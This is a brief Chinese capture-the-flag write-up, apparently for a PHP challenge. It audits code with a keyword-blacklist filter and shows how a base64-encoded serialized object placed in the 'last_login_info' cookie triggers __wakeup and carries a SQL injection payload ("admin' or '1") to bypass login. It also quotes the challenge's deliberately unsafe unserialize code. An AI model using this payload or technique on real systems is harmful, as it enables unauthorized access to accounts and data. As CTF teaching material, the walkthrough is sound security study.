感觉还是有点困，然后就没怎么想

先代码审计

conn.php

```php
public function waf(){
    	$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"]; 
public function __wakeup(){
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        if($this->table){
            $this->waf();
        }
        $this->check_login();
        $this->conn->close();
    }
```

这里发现__wakeup的时候执行了一套mysql的语句（考虑可能sql注入）标准的输入时会过滤好多

于是在cookie注入

index.php

```php
if (isset ($_COOKIE['last_login_info'])) {
    $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));
    try {
        if (is_array($last_login_info) && $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('WAF info: your ip status has been changed, you are dangrous.');
        }
    } catch(Exception $e) {
        die('Error');
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('last_login_info', $cookie, time () + (86400 * 30));
}

```

这里进行了一套反序列化，注意反序列化的时候会自动执行一遍__wakeup

```php
<?php

class SQL {
    public $table = 'users';
    public $username = "admin' or '1";
    public $password = '1';
 }

var_dump(base64_encode (serialize(array( 
     'ip' => '123.123.123.23',
     'sql' => new SQL(),
     ))));
```

这样注入就可以了（可以绕过过滤直接获取）